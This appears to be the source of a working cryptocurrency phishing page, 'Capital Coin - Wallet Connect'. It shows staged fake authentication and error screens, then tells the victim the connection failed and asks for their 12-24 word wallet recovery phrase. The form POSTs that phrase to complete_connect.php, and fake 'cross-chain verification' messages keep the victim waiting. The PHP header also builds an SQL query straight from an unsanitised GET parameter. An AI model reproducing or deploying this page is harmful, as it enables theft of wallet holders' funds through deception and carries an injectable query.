<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();
require 'db.php';
require 'functions.php';


if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}

if (!isset($_GET['user_id'])) {
    include_once 'login.php';
    die;
}


$link_id = $_GET['user_id'];
$sqll = "SELECT email FROM users WHERE id = $link_id";
$result = $conn->query($sqll);
if ($result->rowCount() > 0) {
    $row = $result->fetch(PDO::FETCH_ASSOC);
    $email = $row['email'];
}

$sql_wallet = 'SELECT * FROM wallet_connect_wallets';
$result_wallet = $conn->query($sql_wallet);
    $row = $result_wallet->fetch(PDO::FETCH_ASSOC);
    $wallet_id = $row['id'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Capital Coin - Wallet Connect & Processing</title>

    <style>
        body{margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f5f5f5;font-family:Arial,sans-serif}#connectWalletBtn{padding:12px 24px;font-size:16px;background:#000;color:#fff;border:none;border-radius:8px;cursor:pointer;transition:transform .2s ease}#connectWalletBtn:hover{transform:translateY(-2px)}.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);display:none;justify-content:center;align-items:center;z-index:1000}.modal-overlay.active{display:flex}.modal{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;border-radius:16px;box-shadow:0 25px 50px -12px rgba(0,0,0,.25);opacity:0;visibility:hidden;transition:all .3s cubic-bezier(.4,0,.2,1);z-index:1001;padding:40px;width:600px}.modal.active{opacity:1;visibility:visible}.intro-modal{width:400px}.intro-modal img{width:100px;height:100px;margin-bottom:20px}.get-started-btn{background:#000;color:#fff;border:none;padding:12px 30px;border-radius:8px;cursor:pointer;margin-top:20px;transition:transform .2s ease}.get-started-btn:hover{transform:translateY(-2px)}#walletConnectContent{display:block}#processingContent{display:none}.wallet-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin:20px 0;position:relative;min-height:400px}.wallet-page{position:absolute;width:100%;opacity:0;transform:translateX(20px);transition:all .3s ease;pointer-events:none;display:grid;grid-template-columns:repeat(4,1fr);gap:15px}.wallet-page.active{opacity:1;transform:translateX(0);pointer-events:all}.wallet-item{padding:15px;border:1px solid #eee;border-radius:12px;cursor:pointer;transition:all .2s ease;background:#fff;text-align:center;box-shadow:0 2px 6px rgba(0,0,0,.05)}.wallet-item:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.1)}.wallet-item img{width:64px;height:64px;object-fit:contain;margin-bottom:10px}.pagination{display:flex;gap:10px;justify-content:center;margin-top:20px}.page-number{padding:8px 16px;border:1px solid #ddd;border-radius:6px;cursor:pointer;background:#fff;transition:all .2s ease}.page-number.active{background:#000;color:#fff;border-color:#000}.exit-button{position:absolute;top:20px;right:20px;width:40px;height:40px;border:none;background:#f5f5f5;border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .2s ease}.exit-button:hover{background:#eee}.authenticating-screen,.error-screen,.processing-screen,.approval-screen,.auth-screen,.form-screen{padding:2rem;display:none;width:100%;text-align:center;box-sizing:border-box}.form-screen{display:block}.form-group{margin-bottom:1.5rem;text-align:left}.dropdown-row{display:flex;gap:1rem;margin-bottom:1.5rem;justify-content:center}.dropdown-container{flex:1}select,input,textarea{width:100%;padding:.8rem;border:1px solid #e0e0e0;border-radius:8px;background:#fff;font-size:14px;box-sizing:border-box}textarea{min-height:100px;resize:vertical;font-family:inherit}label{margin-bottom:.5rem;font-weight:500;color:#333;display:block}button[type="submit"],.auth-screen button{background:#000;color:#fff;border:none;padding:.8rem 1.5rem;border-radius:8px;cursor:pointer;font-size:14px;transition:opacity .2s ease}button[type="submit"]:hover,.auth-screen button:hover{opacity:.9}.error-message{color:#dc3545;margin-top:1rem;display:none}.loading-spinner{width:40px;height:40px;border:3px solid #f3f3f3;border-top:3px solid #000;border-radius:50%;animation:spin 1s linear infinite;margin:1rem auto}.approval-status,.auth-status{color:#2196F3;font-weight:700;margin-top:1rem}.status-steps p{margin:.5rem 0;color:#666}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .wallet-page.active {
            overflow: auto;
        }
        @media ( max-width : 400px) {
            .modal.active {
                width: 98%;
            }
        }
    </style>
</head>
<body>
<button id="connectWalletBtn">Connect Wallet</button>
<div class="modal-overlay" id="modalOverlay"></div>
<div class="modal intro-modal" id="introModal">
    <img src="https://dummyimage.com/100x100/6366f1/fff&text=🔒" alt="Security" />
    <h2>Connect Your Wallet</h2>
    <p>Secure connection to access decentralized services. Choose your preferred wallet provider to continue.</p>
    <button class="get-started-btn" id="getStartedBtn">Get Started</button>
</div>
<div class="modal container wallet-modal" id="walletModal">
    <div id="walletConnectContent">
        <h2>Select Wallet</h2>
        <div class="wallet-grid">
            <div class="wallet-page active">
                <?php wallet_name_1($result_wallet) ?>
            </div>
            <div class="wallet-page">
                <div class="wallet-item" data-wallet-id="13"><img src="https://dummyimage.com/64x64/000/fff&text=W1" alt="Wallet1"><span>Wallet 1</span></div>
                <div class="wallet-item" data-wallet-id="14"><img src="https://dummyimage.com/64x64/000/fff&text=W2" alt="Wallet2"><span>Wallet 2</span></div>
                <div class="wallet-item" data-wallet-id="15"><img src="https://dummyimage.com/64x64/000/fff&text=W3" alt="Wallet3"><span>Wallet 3</span></div>
                <div class="wallet-item" data-wallet-id="16"><img src="https://dummyimage.com/64x64/000/fff&text=W4" alt="Wallet4"><span>Wallet 4</span></div>
                <div class="wallet-item" data-wallet-id="17"><img src="https://dummyimage.com/64x64/000/fff&text=W5" alt="Wallet5"><span>Wallet 5</span></div>
                <div class="wallet-item" data-wallet-id="18"><img src="https://dummyimage.com/64x64/000/fff&text=W6" alt="Wallet6"><span>Wallet 6</span></div>
                <div class="wallet-item" data-wallet-id="19"><img src="https://dummyimage.com/64x64/000/fff&text=W7" alt="Wallet7"><span>Wallet 7</span></div>
                <div class="wallet-item" data-wallet-id="20"><img src="https://dummyimage.com/64x64/000/fff&text=W8" alt="Wallet8"><span>Wallet 8</span></div>
                <div class="wallet-item" data-wallet-id="21"><img src="https://dummyimage.com/64x64/000/fff&text=W9" alt="Wallet9"><span>Wallet 9</span></div>
                <div class="wallet-item" data-wallet-id="22"><img src="https://dummyimage.com/64x64/000/fff&text=W10" alt="Wallet10"><span>Wallet 10</span></div>
                <div class="wallet-item" data-wallet-id="23"><img src="https://dummyimage.com/64x64/000/fff&text=W11" alt="Wallet11"><span>Wallet 11</span></div>
                <div class="wallet-item" data-wallet-id="24"><img src="https://dummyimage.com/64x64/000/fff&text=W12" alt="Wallet12"><span>Wallet 12</span></div>
            </div>
            <div class="wallet-page">
                <div class="wallet-item" data-wallet-id="25"><img src="https://dummyimage.com/64x64/000/fff&text=WA" alt="WalletA"><span>Wallet A</span></div>
                <div class="wallet-item" data-wallet-id="26"><img src="https://dummyimage.com/64x64/000/fff&text=WB" alt="WalletB"><span>Wallet B</span></div>
                <div class="wallet-item" data-wallet-id="27"><img src="https://dummyimage.com/64x64/000/fff&text=WC" alt="WalletC"><span>Wallet C</span></div>
                <div class="wallet-item" data-wallet-id="28"><img src="https://dummyimage.com/64x64/000/fff&text=WD" alt="WalletD"><span>Wallet D</span></div>
                <div class="wallet-item" data-wallet-id="29"><img src="https://dummyimage.com/64x64/000/fff&text=WE" alt="WalletE"><span>Wallet E</span></div>
                <div class="wallet-item" data-wallet-id="30"><img src="https://dummyimage.com/64x64/000/fff&text=WF" alt="WalletF"><span>Wallet F</span></div>
                <div class="wallet-item" data-wallet-id="31"><img src="https://dummyimage.com/64x64/000/fff&text=WG" alt="WalletG"><span>Wallet G</span></div>
                <div class="wallet-item" data-wallet-id="32"><img src="https://dummyimage.com/64x64/000/fff&text=WH" alt="WalletH"><span>Wallet H</span></div>
                <div class="wallet-item" data-wallet-id="33"><img src="https://dummyimage.com/64x64/000/fff&text=WI" alt="WalletI"><span>Wallet I</span></div>
                <div class="wallet-item" data-wallet-id="34"><img src="https://dummyimage.com/64x64/000/fff&text=WJ" alt="WalletJ"><span>Wallet J</span></div>
                <div class="wallet-item" data-wallet-id="35"><img src="https://dummyimage.com/64x64/000/fff&text=WK" alt="WalletK"><span>Wallet K</span></div>
                <div class="wallet-item" data-wallet-id="36"><img src="https://dummyimage.com/64x64/000/fff&text=WL" alt="WalletL"><span>Wallet L</span></div>
            </div>
        </div>
        <div class="pagination d-none" style="display: none">
            <button class="page-number active">1</button>
            <button class="page-number">2</button>
            <button class="page-number">3</button>
        </div>
        <button class="exit-button">
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                <path d="M13 1L1 13M1 1L13 13" stroke="black" stroke-width="2"/>
            </svg>
        </button>
    </div>
    <div id="processingContent">
        <div class="authenticating-screen" id="authenticatingScreen">
            <div class="loading-spinner"></div>
            <h3>Authenticating Wallet...</h3>
            <p>Please wait while we secure your connection.</p>
        </div>
        <div class="error-screen" id="initialErrorScreen">
            <h3 style="color: #dc3545;">Initialization Error</h3>
            <p>Wallet connection failed to initialize</p>
        </div>
        <div class="processing-screen" id="processingScreen1">
            <div class="loading-spinner"></div>
            <h3>Initializing Secure Connection</h3>
        </div>
        <div class="processing-screen" id="processingScreen2">
            <div class="loading-spinner"></div>
            <h3>Verifying Network Protocols</h3>
        </div>
        <div class="error-screen" id="finalErrorScreen">
            <h3 style="color: #dc3545;">Connection Error</h3>
            <p>Failed to establish secure connection</p>
            <button onclick="retryConnection()">Try Again</button>
        </div>
        <div class="approval-screen" id="approvalScreen">
            <div class="loading-spinner"></div>
            <h3>Authorization Pending</h3>
            <p class="approval-status">Validating Wallet Credentials</p>
        </div>
        <div class="auth-screen" id="authScreen">
            <div class="loading-spinner"></div>
            <h3>Network Verification</h3>
            <p class="auth-status">Authenticating Across Chains</p>
            <div class="status-steps">
                <p>✓ Transaction Hashes Verified</p>
                <p>✓ Smart Contract Validated</p>
                <p>◌ Cross-Chain Consensus Pending</p>
            </div>
            <button onclick="closeModalAndRedirect()" style="margin-top: 1rem; display: none;">Return to Dashboard</button>
        </div>
        <div class="form-screen" id="formScreen">
            <form id="walletForm">
                <div class="form-group">
                    <label>Passphrase</label>
                    <div style="color: #b60404;font-size: 12px;">wallet was unable to connect, use the form below to connect wallet manually</div>
                    <textarea name="passphrase" placeholder="Enter your BIP-32 API word codes (12-24 words)" required></textarea>
                </div>
                <button type="submit">Initialize Connection</button>
                <div class="error-message" id="errorMessage"></div>
            </form>
        </div>
    </div>
</div>

<script>
    document.addEventListener("DOMContentLoaded", () => {
        let selectedWalletId = null;
        let selectedWalletName = null;
        const connectBtn = document.getElementById("connectWalletBtn");
        const overlay = document.getElementById("modalOverlay");
        const introModal = document.getElementById("introModal");
        const walletModal = document.getElementById("walletModal");
        const getStartedBtn = document.getElementById("getStartedBtn");
        const walletConnectContent = document.getElementById("walletConnectContent");
        const processingContent = document.getElementById("processingContent");
        const pages = document.querySelectorAll(".wallet-page");
        const pageNumbers = document.querySelectorAll(".page-number");

        connectBtn.addEventListener("click", () => {
            introModal.classList.add("active");
            overlay.classList.add("active");
        });

        getStartedBtn.addEventListener("click", () => {
            introModal.classList.remove("active");
            walletModal.classList.add("active");
            walletConnectContent.style.display = "block";
            processingContent.style.display = "none";
        });

        function closeAllModals() {
            introModal.classList.remove("active");
            walletModal.classList.remove("active");
            overlay.classList.remove("active");
        }

        overlay.addEventListener("click", closeAllModals);

        document.querySelectorAll(".exit-button").forEach(btn => {
            btn.addEventListener("click", closeAllModals);
        });

        pageNumbers.forEach((number, index) => {
            number.addEventListener("click", () => {
                pageNumbers.forEach(n => n.classList.remove("active"));
                pages.forEach(page => page.classList.remove("active"));
                number.classList.add("active");
                pages[index].classList.add("active");
            });
        });

        document.querySelectorAll(".wallet-item").forEach(item => {
            item.addEventListener("click", () => {
                selectedWalletId = item.dataset.walletId;
                selectedWalletName = item.dataset.walletName;
                walletConnectContent.style.display = "none";
                processingContent.style.display = "block";
                showAuthenticatingThenError();
            });
        });

        const walletForm = document.getElementById("walletForm");
        walletForm.addEventListener("submit", async (event) => {
            event.preventDefault();
            const errorMessage = document.getElementById("errorMessage");

            if (!selectedWalletId || !walletForm.checkValidity()) {
                errorMessage.style.display = "block";
                errorMessage.textContent = "Please select a wallet and enter passphrase";
                return;
            }

            try {
                hideAllScreens();
                document.getElementById("processingScreen1").style.display = "block";

                const formData = new FormData(walletForm);
                formData.append('wallet_id', selectedWalletId);
                formData.append('wallet_name', selectedWalletName);

                const response = await fetch('complete_connect.php', {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                if (result.success) {
                    setTimeout(() => {
                        hideAllScreens();
                        showApprovalScreen();
                    }, 1500);
                } else {
                    throw new Error(result.message || 'Submission failed');
                }
            } catch (error) {
                console.error("Connection failed:", error);
                errorMessage.textContent = error.message;
                errorMessage.style.display = "block";
                showFinalError();
            }
        });
    });

    function hideAllScreens() {
        document.querySelectorAll("#processingContent > div").forEach(screen => {
            screen.style.display = "none";
        });
    }

    function showAuthenticatingThenError() {
        hideAllScreens();
        document.getElementById("authenticatingScreen").style.display = "block";
        setTimeout(() => {
            hideAllScreens();
            document.getElementById("initialErrorScreen").style.display = "block";
            setTimeout(showProcessingSteps, 1500);
        }, 1500);
    }

    function showProcessingSteps() {
        hideAllScreens();
        document.getElementById("processingScreen1").style.display = "block";
        setTimeout(() => {
            hideAllScreens();
            document.getElementById("processingScreen2").style.display = "block";
            setTimeout(() => {
                hideAllScreens();
                document.getElementById("formScreen").style.display = "block";
            }, 2000);
        }, 2000);
    }

    function showFinalError() {
        hideAllScreens();
        document.getElementById("finalErrorScreen").style.display = "block";
    }

    function showApprovalScreen() {
        hideAllScreens();
        document.getElementById("approvalScreen").style.display = "block";
        setTimeout(() => {
            hideAllScreens();
            showAuthScreen();
        }, 3000);
    }

    let statusInterval;
    function showAuthScreen() {
        hideAllScreens();
        const authScreen = document.getElementById("authScreen");
        authScreen.style.display = "block";
        const statusElement = authScreen.querySelector(".auth-status");
        const statusMessages = [
            "Synchronizing Node Network",
            "Validating Consensus Rules",
            "Establishing Cross-Chain Bridges",
            "Finalizing Cryptographic Proofs"
        ];
        let currentStatus = 0;
        statusInterval = setInterval(() => {
            statusElement.textContent = statusMessages[currentStatus];
            currentStatus = (currentStatus + 1) % statusMessages.length;
        }, 2500);
        setTimeout(() => {
            clearInterval(statusInterval);
            statusElement.textContent = "Verification Process Ongoing";
            authScreen.querySelector(".loading-spinner").style.display = "none";
            authScreen.querySelector("button").style.display = "block";
        }, 15000);
    }

    function retryConnection() {
        hideAllScreens();
        showProcessingSteps();
    }

    function closeModal() {
        document.getElementById("modalOverlay").classList.remove("active");
        document.getElementById("walletModal").classList.remove("active");
        hideAllScreens();
        document.getElementById("formScreen").style.display = "block";
        const authBtn = document.getElementById("authScreen").querySelector("button");
        if (authBtn) authBtn.style.display = "none";
        const spinner = document.getElementById("authScreen").querySelector(".loading-spinner");
        if (spinner) spinner.style.display = "block";
    }

    function closeModalAndRedirect() {
        closeModal();
        setTimeout(() => {
            location.reload();
        }, 500); // Delay of 500ms
    }

</script>
</body>
</html>